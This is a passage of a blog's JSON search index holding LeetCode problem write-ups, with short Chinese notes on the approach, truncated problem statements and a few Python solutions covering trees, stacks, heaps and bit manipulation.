diff |8-2| = 6 > 4.[8,2,4,7] with maximum absolute diff |8-2| = 6 > 4.[2] with maximum absolute diff |2-2| = 0 ","categories":["Algorithm","Leetcode"],"tags":["Array","Heap (Priority Queue)","Sliding Window","Monotonic Queue","Queue","Ordered Set"]},{"title":"leetcode-1448 - Count Good Nodes in Binary Tree","url":"/2021/08/leetcode-1448/","content":"動機\n就dfs傳範圍\n\nProblem\nGiven a binary tree root, a node X in the tree is named good if in the path from root to X there are no nodes with a value greater than X.Return the number of good nodes in the binary tree. Example 1:Input: root = [3,1,4,3,Leetcode,1,5]Output: 4Explanation: Nodes in blue are good.Root Node (3) is always a good node.Node 4 -> (3,4) is the maximum value in the path starting from the root.Node 5 -> (3,4,5) is the maximum value in the pathNode 3 -> (3,1,3) is the maximum value in the path.Example 2:Input: root = [3,3,null,4,2]Output: 3Explanation: Node 2 -> (3, 3, 2) is not good, because \"3\" is higher than it.Example 3:Input: root = [1]Output: 1Explanation: Root is considered as good. Constraints:The number of nodes in the binary tree is in the range [1, 10^5].Each node's value is between [-10^4, 10^4].\nSol\nclass Solution:    def goodNodes(self, root: TreeNode,val=float(&#x27;-inf&#x27;)) -&gt; int:        if not root:            return 0        elif root.val &gt;= val:            return 1+self.goodNodes(root.left,root.val)+self.goodNodes(root.right,root.val)        else:            return self.goodNodes(root.left,val)+self.goodNodes(root.right,val)","categories":["Algorithm","Leetcode"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-147 - Insertion Sort List","url":"/2021/08/leetcode-147/","content":"動機\n複習linked list的處理手法\n\nProblem\nGiven the head of a singly linked list, sort the list using insertion sort, and return the sorted list's head.The steps of the insertion sort algorithm:Insertion sort iterates, consuming one input element each repetition and growing a sorted output list.At each iteration, insertion sort removes one element from the input data, finds the location it belongs within the sorted list and inserts it there.It repeats until no input elements remain.The following is a graphical example of the insertion sort algorithm. The partially sorted list (black) initially contains only the first element in the list. One element (red) is removed from the input data and inserted in-place into the sorted list with each iteration. Example 1:Input: head = [4,2,1,3]Output: [1,2,3,4]Example 2:Input: head = [-1,5,3,4,0]Output: [-1,0,3,4,5] Constraints:The number of nodes in the list is in the range [1, 5000].-5000 ","categories":["Algorithm","Leetcode"],"tags":["Linked List","Sorting"]},{"title":"leetcode-1632 - Rank Transform of a Matrix","url":"/2021/08/leetcode-1632/","content":"動機\n1331變成2維\n\nProblem\nGiven an m x n matrix, return a new matrix answer where answer[row][col] is the rank of matrix[row][col].The rank is an integer that represents how large an element is compared to other elements. It is calculated using the following rules:tThe rank is an integer starting from 1.tIf two elements p and q are in the same row or column, then:tttIf p < q then rank(p) < rank(q)ttIf p == q then rank(p) == rank(q)ttIf p > q then rank(p) > rank(q)tttThe rank should be as small as possible.It is guaranteed that answer is unique under the given rules. Example 1:Input: matrix = [[1,2],[3,4]]Output: [[1,2],[2,3]]Explanation:The rank of matrix[0][0] is 1 because it is the smallest integer in its row and column.The rank of matrix[0][1] is 2 because matrix[0][1] > matrix[0][0] and matrix[0][0] is rank 1.The rank of matrix[1][0] is 2 because matrix[1][0] > matrix[0][0] and matrix[0][0] is rank 1.The rank of matrix[1][1] is 3 because matrix[1][1] > matrix[0][1], matrix[1][1] > matrix[1][0], and both matrix[0][1] and matrix[1][0] are rank 2.Example 2:Input: matrix = [[7,7],[7,7]]Output: [[1,1],[1,1]]Example 3:Input: matrix = [[20,-21,14],[-19,4,19],[22,-47,24],[-19,4,19]]Output: [[4,2,3],[1,3,4],[5,1,6],[1,3,4]]Example 4:Input: matrix = [[7,3,6],[1,4,5],[9,8,2]]Output: [[5,1,4],[1,2,3],[6,3,1]] Constraints:tm == matrix.lengthtn == matrix[i].lengtht1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Matrix","Union Find","Greedy","Graph","Topological Sort"]},{"title":"leetcode-1793 - Maximum Score of a Good Subarray","url":"/2021/08/leetcode-1793/","content":"動機\n看84\n\nProblem\nYou are given an array of integers nums (0-indexed) and an integer k.The score of a subarray (i, j) is defined as min(nums[i], nums[i+1], ..., nums[j]) * (j - i + 1). A good subarray is a subarray where i ","categories":["Algorithm","Leetcode"],"tags":["Array","Stack","Two Pointers","Monotonic Stack"]},{"title":"leetcode-18 - 4Sum","url":"/2021/08/leetcode-18/","content":"動機\n有剪枝差太多\n\nProblem\nGiven an array nums of n integers, return an array of all the unique quadruplets [nums[a], nums[b], nums[c], nums[d]] such that:t0 ","categories":["Algorithm","Leetcode"],"tags":["Array","Two Pointers","Sorting"]},{"title":"leetcode-1856 - Maximum Subarray Min-Product","url":"/2021/08/leetcode-1856/","content":"動機\n把84的monotonic stack介紹借過來一下\n1 2 3 .left. 7 .right. 2\nright的數字大小一定是大於7!!\nleft的數字一定是等於7\n所以在這個區間中7一定是最小\n這樣就可以用在題\n\nProblem\nThe min-product of an array is equal to the minimum value in the array multiplied by the array's sum.For example, the array [3,2,5] (minimum value is 2) has a min-product of 2 * (3+2+5) = 2 * 10 = 20.Given an array of integers nums, return the maximum min-product of any non-empty subarray of nums. Since the answer may be large, return it modulo 109 + 7.Note that the min-product should be maximized before performing the modulo operation. Testcases are generated such that the maximum min-product without modulo will fit in a 64-bit signed integer.A subarray is a contiguous part of an array. Example 1:Input: nums = [1,2,3,2]Output: 14Explanation: The maximum min-product is achieved with the subarray [2,3,2] (minimum value is 2).2 * (2+3+2) = 2 * 7 = 14.Example 2:Input: nums = [2,3,3,1,2]Output: 18Explanation: The maximum min-product is achieved with the subarray [3,3] (minimum value is 3).3 * (3+3) = 3 * 6 = 18.Example 3:Input: nums = [3,1,5,6,4,2]Output: 60Explanation: The maximum min-product is achieved with the subarray [5,6,4] (minimum value is 4).4 * (5+6+4) = 4 * 15 = 60. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Stack","Prefix Sum","Monotonic Stack"]},{"title":"leetcode-260 - Single Number III","url":"/2021/08/leetcode-260/","content":"動機\n又是看創意的一題，以後是不是要給這種題目個標籤\n用mask其中一個bit做分類依據\n\nProblem\nGiven an integer array nums, in which exactly two elements appear only once and all the other elements appear exactly twice. Find the two elements that appear only once. You can return the answer in any order.You must write an algorithm that runs in linear runtime complexity and uses only constant extra space. Example 1:Input: nums = [1,2,1,3,2,5]Output: [3,5]Explanation:  [5, 3] is also a valid answer.Example 2:Input: nums = [-1,0]Output: [-1,0]Example 3:Input: nums = [0,1]Output: [1,0] Constraints:t2 ","categories":["Algorithm","Leetcode"],"tags":["Array","Bit Manipulation"]},{"title":"leetcode-30 - Substring with Concatenation of All Words","url":"/2021/08/leetcode-30/","content":"動機\n題目明明已經把same length上粗體了，還看不到…\n\nProblem\nYou are given a string s and an array of strings words of the same length. Return all starting indices of substring(s) in s that is a concatenation of each word in words exactly once, in any order, and without any intervening characters.You can return the answer in any order. Example 1:Input: s = barfoothefoobarman, words = [foo,bar]Output: [0,9]Explanation: Substrings starting at index 0 and 9 are barfoo and foobar respectively.The output order does not matter, returning [9,0] is fine too.Example 2:Input: s = wordgoodgoodgoodbestword, words = [word,good,best,word]Output: []Example 3:Input: s = barfoofoobarthefoobarman, words = [bar,foo,the]Output: [6,9,12] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["String","Hash Table","Sliding Window"]},{"title":"leetcode-310 - Minimum Height Trees","url":"/2021/08/leetcode-310/","content":"動機\n\n第一次看到bfs這麼用\n這樣叫topo sort嗎?\n很漂亮的算法，真的很漂亮\n\n\nProblem\nA tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.Given a tree of n nodes labelled from 0 to n - 1, and an array of n - 1 edges where edges[i] = [ai, bi] indicates that there is an undirected edge between the two nodes ai and bi in the tree, you can choose any node of the tree as the root. When you select a node x as the root, the result tree has height h. Among all possible rooted trees, those with minimum height (i.e. min(h))  are called minimum height trees (MHTs).Return a list of all MHTs' root labels. You can return the answer in any order.The height of a rooted tree is the number of edges on the longest downward path between the root and a leaf. Example 1:Input: n = 4, edges = [[1,0],[1,2],[1,3]]Output: [1]Explanation: As shown, the height of the tree is 1 when the root is the node with label 1 which is the only MHT.Example 2:Input: n = 6, edges = [[3,0],[3,1],[3,2],[3,4],[5,4]]Output: [3,4]Example 3:Input: n = 1, edges = []Output: [0]Example 4:Input: n = 2, edges = [[0,1]]Output: [0,1] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Breadth-First Search","Depth-First Search","Graph","Topological Sort"]},{"title":"leetcode-316 - Remove Duplicate Letters","url":"/2021/08/leetcode-316/","content":"動機\n保持原本的順序，維持字典序(小於等於)\nMonotonic Stack\n\nProblem\nGiven a string s, remove duplicate letters so that every letter appears once and only once. You must make sure your result is the smallest in lexicographical order among all possible results. Example 1:Input: s = \"bcabc\"Output: \"abc\"Example 2:Input: s = \"cbacdcbc\"Output: \"acdb\" Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Stack","Greedy","Monotonic Stack"]},{"title":"leetcode-321 - Create Maximum Number","url":"/2021/08/leetcode-321/","content":"動機\n沒有魔法的一題\n但要怎麼看出沒有魔法?\n\nProblem\nYou are given two integer arrays nums1 and nums2 of lengths m and n respectively. nums1 and nums2 represent the digits of two numbers. You are also given an integer k.Create the maximum number of length k ","categories":["Algorithm","Leetcode"],"tags":["Stack","Greedy","Monotonic Stack"]},{"title":"leetcode-336 - Palindrome Pairs","url":"/2021/08/leetcode-336/","content":"動機\nHard題都是來看創意的\n中間是回文，前半是後面的reverse\n\nProblem\nGiven a list of unique words, return all the pairs of the distinct indices (i, j) in the given list, so that the concatenation of the two words words[i] + words[j] is a palindrome. Example 1:Input: words = [abcd,dcba,lls,s,sssll]Output: [[0,1],[1,0],[3,2],[2,4]]Explanation: The palindromes are [dcbaabcd,abcddcba,slls,llssssll]Example 2:Input: words = [bat,tab,cat]Output: [[0,1],[1,0]]Explanation: The palindromes are [battab,tabbat]Example 3:Input: words = [a,]Output: [[0,1],[1,0]] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["String","Array","Hash Table","Trie"]},{"title":"leetcode-342 - Power of Four","url":"/2021/08/leetcode-342/","content":"動機\nBit Manipulation，怕\n\nProblem\nGiven an integer n, return true if it is a power of four. Otherwise, return false.An integer n is a power of four, if there exists an integer x such that n == 4x. Example 1:Input: n = 16Output: trueExample 2:Input: n = 5Output: falseExample 3:Input: n = 1Output: true Constraints:t-231 ","categories":["Algorithm","Leetcode"],"tags":["Recursion","Math","Bit Manipulation"]},{"title":"leetcode-352 - Data Stream as Disjoint Intervals","url":"/2021/08/leetcode-352/","content":"動機\n為什麼我的interval merge這麼痛苦\ninsight: 只要sort過的list就可以直接當heap用\n\nProblem\nGiven a data stream input of non-negative integers a1, a2, ..., an, summarize the numbers seen so far as a list of disjoint intervals.Implement the SummaryRanges class:tSummaryRanges() Initializes the object with an empty stream.tvoid addNum(int val) Adds the integer val to the stream.tint[][] getIntervals() Returns a summary of the integers in the stream currently as a list of disjoint intervals [starti, endi]. Example 1:Input[\"SummaryRanges\", \"addNum\", \"getIntervals\", \"addNum\", \"getIntervals\", \"addNum\", \"getIntervals\", \"addNum\", \"getIntervals\", \"addNum\", \"getIntervals\"][[], [1], [], [3], [], [7], [], [2], [], [6], []]Output[Algorithm, Leetcode, null, [[1, 1]], null, [[1, 1], [3, 3]], null, [[1, 1], [3, 3], [7, 7]], null, [[1, 3], [7, 7]], null, [[1, 3], [6, 7]]]ExplanationSummaryRanges summaryRanges = new SummaryRanges();summaryRanges.addNum(1);      // arr = [1]summaryRanges.getIntervals(); // return [[1, 1]]summaryRanges.addNum(3);      // arr = [1, 3]summaryRanges.getIntervals(); // return [[1, 1], [3, 3]]summaryRanges.addNum(7);      // arr = [1, 3, 7]summaryRanges.getIntervals(); // return [[1, 1], [3, 3], [7, 7]]summaryRanges.addNum(2);      // arr = [1, 2, 3, 7]summaryRanges.getIntervals(); // return [[1, 3], [7, 7]]summaryRanges.addNum(6);      // arr = [1, 2, 3, 6, 7]summaryRanges.getIntervals(); // return [[1, 3], [6, 7]] Constraints:t0 ","categories":["Algorithm","Leetcode"],"tags":["Design","Binary Search","Ordered Set"]},{"title":"leetcode-354 - Russian Doll Envelopes","url":"/2021/08/leetcode-354/","content":"動機\n看別人的解題心得之前純dp會過，但現在會吃TLE…\ninsight: 固定一維做lis\n\nProblem\nYou are given a 2D array of integers envelopes where envelopes[i] = [wi, hi] represents the width and the height of an envelope.One envelope can fit into another if and only if both the width and height of one envelope are greater than the other envelope's width and height.Return the maximum number of envelopes you can Russian doll (i.e., put one inside the other).Note: You cannot rotate an envelope. Example 1:Input: envelopes = [[5,4],[6,4],[6,7],[2,3]]Output: 3Explanation: The maximum number of envelopes you can Russian doll is 3 ([2,3] => [5,4] => [6,7]).Example 2:Input: envelopes = [[1,1],[1,1],[1,1]]Output: 1 Constraints:t1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array","Binary Search","Sorting"]},{"title":"leetcode-355 - Design Twitter","url":"/2021/08/leetcode-355/","content":"動機\n原本以為很複雜，結果異常的簡單\n\nProblem\nDesign a simplified version of Twitter where users can post tweets, follow/unfollow another user, and is able to see the 10 most recent tweets in the user's news feed.Implement the Twitter class:tTwitter() Initializes your twitter object.tvoid postTweet(int userId, int tweetId) Composes a new tweet with ID tweetId by the user userId. Each call to this function will be made with a unique tweetId.tList getNewsFeed(int userId) Retrieves the 10 most recent tweet IDs in the user's news feed. Each item in the news feed must be posted by users who the user followed or by the user themself. Tweets must be ordered from most recent to least recent.tvoid follow(int followerId, int followeeId) The user with ID followerId started following the user with ID followeeId.tvoid unfollow(int followerId, int followeeId) The user with ID followerId started unfollowing the user with ID followeeId. Example 1:Input[\"Twitter\", \"postTweet\", \"getNewsFeed\", \"follow\", \"postTweet\", \"getNewsFeed\", \"unfollow\", \"getNewsFeed\"][[], [1, 5], [1], [1, 2], [2, 6], [1], [1, 2], [1]]Output[Algorithm, Leetcode, null, [5], null, null, [6, 5], null, [5]]ExplanationTwitter twitter = new Twitter();twitter.postTweet(1, 5); // User 1 posts a new tweet (id = 5).twitter.getNewsFeed(1);  // User 1's news feed should return a list with 1 tweet id -> [5]. return [5]twitter.follow(1, 2);    // User 1 follows user 2.twitter.postTweet(2, 6); // User 2 posts a new tweet (id = 6).twitter.getNewsFeed(1);  // User 1's news feed should return a list with 2 tweet ids -> [6, 5]. Tweet id 6 should precede tweet id 5 because it is posted after tweet id 5.twitter.unfollow(1, 2);  // User 1 unfollows user 2.twitter.getNewsFeed(1);  // User 1's news feed should return a list with 1 tweet id -> [5], since user 1 is no longer following user 2. Constraints:t1 ","categories":["Algorithm","Leetcode"],"tags":["Design","Heap (Priority Queue)","Linked List","Hash Table"]},{"title":"leetcode-386 - Lexicographical Numbers","url":"/2021/08/leetcode-386/","content":"動機\n從最左一路加digit上去\n\nProblem\nGiven an integer n, return all the numbers in the range [1, n] sorted in lexicographical order.You must write an algorithm that runs in O(n) time and uses O(1) extra space.  Example 1:Input: n = 13Output: [1,10,11,12,13,2,3,4,5,6,7,8,9]Example 2:Input: n = 2Output: [1,2] Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Depth-First Search","Trie"]},{"title":"leetcode-389 - Find the Difference","url":"/2021/08/leetcode-389/","content":"動機\n只有一個不一樣的就xor下去\n\nProblem\nYou are given two strings s and t.String t is generated by random shuffling string s and then add one more letter at a random position.Return the letter that was added to t. Example 1:Input: s = \"abcd\", t = \"abcde\"Output: \"e\"Explanation: 'e' is the letter that was added.Example 2:Input: s = \"\", t = \"y\"Output: \"y\"Example 3:Input: s = \"a\", t = \"aa\"Output: \"a\"Example 4:Input: s = \"ae\", t = \"aea\"Output: \"a\" Constraints:t0 ","categories":["Algorithm","Leetcode"],"tags":["String","Bit Manipulation","Hash Table","Sorting"]},{"title":"leetcode-396 - Rotate Function","url":"/2021/08/leetcode-396/","content":"動機\n推導怎麼那麼難想，脫離高中太久，忘了還可以用相減去看\n\nProblem\nYou are given an integer array nums of length n.Assume arrk to be an array obtained by rotating nums by k positions clock-wise. We define the rotation function F on nums as follow:tF(k) = 0 * arrk[0] + 1 * arrk[1] + ... + (n - 1) * arrk[n - 1].Return the maximum value of F(0), F(1), ..., F(n-1).The test cases are generated so that the answer fits in a 32-bit integer. Example 1:Input: nums = [4,3,2,6]Output: 26Explanation:F(0) = (0 * 4) + (1 * 3) + (2 * 2) + (3 * 6) = 0 + 3 + 4 + 18 = 25F(1) = (0 * 6) + (1 * 4) + (2 * 3) + (3 * 2) = 0 + 4 + 6 + 6 = 16F(2) = (0 * 2) + (1 * 6) + (2 * 4) + (3 * 3) = 0 + 6 + 8 + 9 = 23F(3) = (0 * 3) + (1 * 2) + (2 * 6) + (3 * 4) = 0 + 2 + 12 + 12 = 26So the maximum value of F(0), F(1), F(2), F(3) is F(3) = 26.Example 2:Input: nums = [100]Output: 0 Constraints:tn == nums.lengtht1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Math"]},{"title":"leetcode-398 - Random Pick Index","url":"/2021/08/leetcode-398/","content":"動機\n要找時間看Reservoir Sampling\n\nProblem\nGiven an integer array nums with possible duplicates, randomly output the index of a given target number. You can assume that the given target number must exist in the array.Implement the Solution class:tSolution(int[] nums) Initializes the object with the array nums.tint pick(int target) Picks a random index i from nums where nums[i] == target. If there are multiple valid i's, then each index should have an equal probability of returning. Example 1:Input[\"Solution\", \"pick\", \"pick\", \"pick\"][[[1, 2, 3, 3, 3]], [3], [1], [3]]Output[Algorithm, Leetcode, 4, 0, 2]ExplanationSolution solution = new Solution([1, 2, 3, 3, 3]);solution.pick(3); // It should return either index 2, 3, or 4 randomly. Each index should have equal probability of returning.solution.pick(1); // It should return 0. Since in the array only nums[0] is equal to 1.solution.pick(3); // It should return either index 2, 3, or 4 randomly. Each index should have equal probability of returning. Constraints:t1 ","categories":["Algorithm","Leetcode"],"tags":["Math","Hash Table","Randomized","Reservoir Sampling"]},{"title":"leetcode-399 - Evaluate Division","url":"/2021/08/leetcode-399/","content":"動機\n建圖去走\n\nProblem\nYou are given an array of variable pairs equations and an array of real numbers values, where equations[i] = [Ai, Bi] and values[i] represent the equation Ai / Bi = values[i]. Each Ai or Bi is a string that represents a single variable.You are also given some queries, where queries[j] = [Cj, Dj] represents the jth query where you must find the answer for Cj / Dj = ?.Return the answers to all queries. If a single answer cannot be determined, return -1.0.Note: The input is always valid. You may assume that evaluating the queries will not result in division by zero and that there is no contradiction. Example 1:Input: equations = [[\"a\",\"b\"],[\"b\",\"c\"]], values = [2.0,3.0], queries = [[\"a\",\"c\"],[\"b\",\"a\"],[\"a\",\"e\"],[\"a\",\"a\"],[\"x\",\"x\"]]Output: [6.00000,0.50000,-1.00000,1.00000,-1.00000]Explanation: Given: a / b = 2.0, b / c = 3.0queries are: a / c = ?, b / a = ?, a / e = ?, a / a = ?, x / x = ?return: [6.0, 0.5, -1.0, 1.0, -1.0 ]Example 2:Input: equations = [[\"a\",\"b\"],[\"b\",\"c\"],[\"bc\",\"cd\"]], values = [1.5,2.5,5.0], queries = [[\"a\",\"c\"],[\"c\",\"b\"],[\"bc\",\"cd\"],[\"cd\",\"bc\"]]Output: [3.75000,0.40000,5.00000,0.20000]Example 3:Input: equations = [[\"a\",\"b\"]], values = [0.5], queries = [[\"a\",\"b\"],[\"b\",\"a\"],[\"a\",\"c\"],[\"x\",\"y\"]]Output: [0.50000,2.00000,-1.00000,-1.00000] Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Union Find","Breadth-First Search","Depth-First Search","Graph","Shortest Path"]},{"title":"leetcode-402 - Remove K Digits","url":"/2021/08/leetcode-402/","content":"動機\n讓前面數字越小越好!!\n\nProblem\nGiven string num representing a non-negative integer num, and an integer k, return the smallest possible integer after removing k digits from num. Example 1:Input: num = \"1432219\", k = 3Output: \"1219\"Explanation: Remove the three digits 4, 3, and 2 to form the new number 1219 which is the smallest.Example 2:Input: num = \"10200\", k = 1Output: \"200\"Explanation: Remove the leading 1 and the number is 200. Note that the output must not contain leading zeroes.Example 3:Input: num = \"10\", k = 2Output: \"0\"Explanation: Remove all the digits from the number and it is left with nothing which is 0. Constraints:t1 ","categories":["Algorithm","Leetcode"],"tags":["String","Stack","Greedy","Monotonic Stack"]},{"title":"leetcode-404 - Sum of Left Leaves","url":"/2021/08/leetcode-404/","content":"動機\n不管right leaf的dfs\n\nProblem\nGiven the root of a binary tree, return the sum of all left leaves. Example 1:Input: root = [3,9,20,Leetcode,null,15,7]Output: 24Explanation: There are two left leaves in the binary tree, with values 9 and 15 respectively.Example 2:Input: root = [1]Output: 0 Constraints:tThe number of nodes in the tree is in the range [1, 1000].t-1000 ","categories":["Algorithm","Leetcode"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-415 - Add Strings","url":"/2021/08/leetcode-415/","content":"動機\n就之前的add two number\n\nProblem\nGiven two non-negative integers, num1 and num2 represented as string, return the sum of num1 and num2 as a string.You must solve the problem without using any built-in library for handling large integers (such as BigInteger). You must also not convert the inputs to integers directly. Example 1:Input: num1 = \"11\", num2 = \"123\"Output: \"134\"Example 2:Input: num1 = \"456\", num2 = \"77\"Output: \"533\"Example 3:Input: num1 = \"0\", num2 = \"0\"Output: \"0\" Constraints:t1 ","categories":["Algorithm","Leetcode"],"tags":["String","Math","Simulation"]},{"title":"leetcode-421 - Maximum XOR of Two Numbers in an Array","url":"/2021/08/leetcode-421/","content":"動機\n真的很有趣，利用bit是list，與xor的特性，所以我可以從最高位一位一位建答案\n\nProblem\nGiven an integer array nums, return the maximum result of nums[i] XOR nums[j], where 0 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Bit Manipulation","Hash Table","Trie"]},{"title":"leetcode-429 - N-ary Tree Level Order Traversal","url":"/2021/08/leetcode-429/","content":"動機\n複習BFS\n\nProblem\nGiven an n-ary tree, return the level order traversal of its nodes' values.Nary-Tree input serialization is represented in their level order traversal, each group of children is separated by the Leetcode value (See examples). Example 1:Input: root = [1,null,3,2,4,null,5,6]Output: [[1],[3,2,4],[5,6]]Example 2:Input: root = [1,null,2,3,4,5,null,null,6,7,null,8,null,9,10,null,null,11,null,12,null,13,null,null,14]Output: [[1],[2,3,4,5],[6,7,8,9,10],[11,12,13],[14]] Constraints:tThe height of the n-ary tree is less than or equal to 1000tThe total number of nodes is between [0, 104]\nSol\nclass Solution:    def levelOrder(self, root: &#x27;Node&#x27;) -&gt; List[List[int]]:        if not root:            return []        q = deque([[root]])        ret = []        while q:            rs = q.popleft()            ret.append([r.val for r in rs])            rs = sum([[x for x in r.children if x] for r in rs if r],[])            if rs:                q.append(rs)        return ret","categories":["Algorithm","Leetcode"],"tags":["Breadth-First Search","Tree"]},{"title":"leetcode-433 - Minimum Genetic Mutation","url":"/2021/08/leetcode-433/","content":"動機\nBFS硬幹\n\nProblem\nA gene string can be represented by an 8-character long string, with choices from 'A', 'C', 'G', and 'T'.Suppose we need to investigate a mutation from a gene string start to a gene string end where one mutation is defined as one single character changed in the gene string.For example, \"AACCGGTT\" --> \"AACCGGTA\" is one mutation.There is also a gene bank bank that records all the valid gene mutations. A gene must be in bank to make it a valid gene string.Given the two gene strings start and end and the gene bank bank, return the minimum number of mutations needed to mutate from start to end. If there is no such a mutation, return -1.Note that the starting point is assumed to be valid, so it might not be included in the bank. Example 1:Input: start = \"AACCGGTT\", end = \"AACCGGTA\", bank = [\"AACCGGTA\"]Output: 1Example 2:Input: start = \"AACCGGTT\", end = \"AAACGGTA\", bank = [\"AACCGGTA\",\"AACCGCTA\",\"AAACGGTA\"]Output: 2Example 3:Input: start = \"AAAAACCC\", end = \"AACCCCCC\", bank = [\"AAAACCCC\",\"AAACCCCC\",\"AACCCCCC\"]Output: 3 Constraints:start.length == 8end.length == 80 ","categories":["Algorithm","Leetcode"],"tags":["String","Breadth-First Search","Hash Table"]},{"title":"leetcode-450 - Delete Node in a BST","url":"/2021/08/leetcode-450/","content":"動機\n找右邊的最小，之後重建tree\n\nProblem\nGiven a root node reference of a BST and a key, delete the node with the given key in the BST. Return the root node reference (possibly updated) of the BST.Basically, the deletion can be divided into two stages:tSearch for a node to remove.tIf the node is found, delete the node.Follow up: Can you solve it with time complexity O(height of tree)? Example 1:Input: root = [5,3,6,2,4,Leetcode,7], key = 3Output: [5,4,6,2,null,null,7]Explanation: Given key to delete is 3. So we find the node with value 3 and delete it.One valid answer is [5,4,6,2,null,null,7], shown in the above BST.Please notice that another valid answer is [5,2,6,null,4,null,7] and it's also accepted.Example 2:Input: root = [5,3,6,2,4,null,7], key = 0Output: [5,3,6,2,4,null,7]Explanation: The tree does not contain a node with value = 0.Example 3:Input: root = [], key = 0Output: [] Constraints:The number of nodes in the tree is in the range [0, 104].-105 ","categories":["Algorithm","Leetcode"],"tags":["Binary Tree","Tree","Binary Search Tree"]},{"title":"leetcode-480 - Sliding Window Median","url":"/2021/08/leetcode-480/","content":"動機\n對的資料結構帶你上天堂\n\nProblem\nThe median is the middle value in an ordered integer list. If the size of the list is even, there is no middle value. So the median is the mean of the two middle values.For examples, if arr = [2,3,4], the median is 3.For examples, if arr = [1,2,3,4], the median is (2 + 3) / 2 = 2.5.You are given an integer array nums and an integer k. There is a sliding window of size k which is moving from the very left of the array to the very right. You can only see the k numbers in the window. Each time the sliding window moves right by one position.Return the median array for each window in the original array. Answers within 10-5 of the actual value will be accepted. Example 1:Input: nums = [1,3,-1,-3,5,3,6,7], k = 3Output: [1.00000,-1.00000,-1.00000,3.00000,5.00000,6.00000]Explanation: Window position                Median---------------                -----[1  3  -1] -3  5  3  6  7        1 1 [3  -1  -3] 5  3  6  7       -1 1  3 [-1  -3  5] 3  6  7       -1 1  3  -1 [-3  5  3] 6  7        3 1  3  -1  -3 [5  3  6] 7        5 1  3  -1  -3  5 [3  6  7]       6Example 2:Input: nums = [1,2,3,4,2,3,1,4,2], k = 3Output: [2.00000,3.00000,3.00000,3.00000,2.00000,3.00000,2.00000] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Heap (Priority Queue)","Hash Table","Sliding Window"]},{"title":"leetcode-492 - Construct the Rectangle","url":"/2021/08/leetcode-492/","content":"動機\n對ㄟ，除2是一半，sqrt也是一半\ninsight: sqrt也是一半\n\nProblem\nA web developer needs to know how to design a web page's size. So, given a specific rectangular web page’s area, your job by now is to design a rectangular web page, whose length L and width W satisfy the following requirements:The area of the rectangular web page you designed must equal to the given target area.The width W should not be larger than the length L, which means L >= W.The difference between length L and width W should be as small as possible.Return an array [L, W] where L and W are the length and width of the web page you designed in sequence. Example 1:Input: area = 4Output: [2,2]Explanation: The target area is 4, and all the possible ways to construct it are [1,4], [2,2], [4,1]. But according to requirement 2, [1,4] is illegal; according to requirement 3,  [4,1] is not optimal compared to [2,2]. So the length L is 2, and the width W is 2.Example 2:Input: area = 37Output: [37,1]Example 3:Input: area = 122122Output: [427,286] Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Math"]},{"title":"leetcode-498 - Diagonal Traverse","url":"/2021/08/leetcode-498/","content":"動機\nreverse是好東西\n\nProblem\nGiven an m x n matrix mat, return an array of all the elements of the array in a diagonal order. Example 1:Input: mat = [[1,2,3],[4,5,6],[7,8,9]]Output: [1,2,4,7,5,3,6,8,9]Example 2:Input: mat = [[1,2],[3,4]]Output: [1,2,3,4] Constraints:tm == mat.lengthtn == mat[i].lengtht1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Matrix","Simulation"]},{"title":"leetcode-501 - Find Mode in Binary Search Tree","url":"/2021/08/leetcode-501/","content":"動機\nBST的inorder就是sort過的list!!\n忘了!!\n\nProblem\nGiven the root of a binary search tree (BST) with duplicates, return all the mode(s) (i.e., the most frequently occurred element) in it.If the tree has more than one mode, return them in any order.Assume a BST is defined as follows:tThe left subtree of a node contains only nodes with keys less than or equal to the node's key.tThe right subtree of a node contains only nodes with keys greater than or equal to the node's key.tBoth the left and right subtrees must also be binary search trees. Example 1:Input: root = [1,Leetcode,2,2]Output: [2]Example 2:Input: root = [0]Output: [0] Constraints:tThe number of nodes in the tree is in the range [1, 104].t-105 ","categories":["Algorithm","Leetcode"],"tags":["Depth-First Search","Binary Tree","Tree","Binary Search Tree"]},{"title":"leetcode-503 - Next Greater Element II","url":"/2021/08/leetcode-503/","content":"動機\nMonotonic Stack其中一個功能就是在pop的時候可以知道下一個最大\n\nProblem\nGiven a circular integer array nums (i.e., the next element of nums[nums.length - 1] is nums[0]), return the next greater number for every element in nums.The next greater number of a number x is the first greater number to its traversing-order next in the array, which means you could search circularly to find its next greater number. If it doesn't exist, return -1 for this number. Example 1:Input: nums = [1,2,1]Output: [2,-1,2]Explanation: The first 1's next greater number is 2; The number 2 can't find next greater number. The second 1's next greater number needs to search circularly, which is also 2.Example 2:Input: nums = [1,2,3,4,3]Output: [2,3,4,-1,4] Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Stack","Monotonic Stack"]},{"title":"leetcode-516 - Longest Palindromic Subsequence","url":"/2021/08/leetcode-516/","content":"動機\n我忘了dp\n\nProblem\nGiven a string s, find the longest palindromic subsequence's length in s.A subsequence is a sequence that can be derived from another sequence by deleting some or no elements without changing the order of the remaining elements. Example 1:Input: s = \"bbbab\"Output: 4Explanation: One possible longest palindromic subsequence is \"bbbb\".Example 2:Input: s = \"cbbd\"Output: 2Explanation: One possible longest palindromic subsequence is \"bb\". Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","String"]},{"title":"leetcode-52 - N-Queens II","url":"/2021/08/leetcode-52/","content":"動機\n如果兩點在對角線上x,y軸的差值會一樣!!\n\nProblem\nThe n-queens puzzle is the problem of placing n queens on 